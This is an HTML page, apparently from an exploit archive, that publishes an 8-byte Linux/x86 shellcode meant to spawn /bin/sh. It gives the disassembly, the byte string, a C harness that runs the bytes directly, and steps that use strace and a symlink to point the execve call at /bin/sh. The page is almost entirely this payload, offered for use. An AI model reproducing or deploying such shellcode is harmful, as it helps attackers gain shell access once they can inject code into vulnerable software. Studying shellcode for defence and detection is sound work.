<html><head><title>Linux/x86 - /bin/sh - 8 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
08048334 &lt;main&gt;:
 8048334:   99                      cltd
 8048335:   6a 0b                   push   $0xb
 8048337:   58                      pop    %eax
 8048338:   60                      pusha
 8048339:   59                      pop    %ecx
 804833a:   cd 80                   int    $0x80
 
using this code.
 
step1. This code is compiled.
step2. strace -x output binary
step3. get execve args in strace result.
step4. create link execve args on /bin/sh
 
*/
 
unsigned char sc[]=
&quot;\x99\x6a\x0b\x58\x60\x59\xcd\x80&quot;;
int main()
{
    void (*p)();
    p = sc;
    p();
}
 
have a nice day~
 
thx~

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
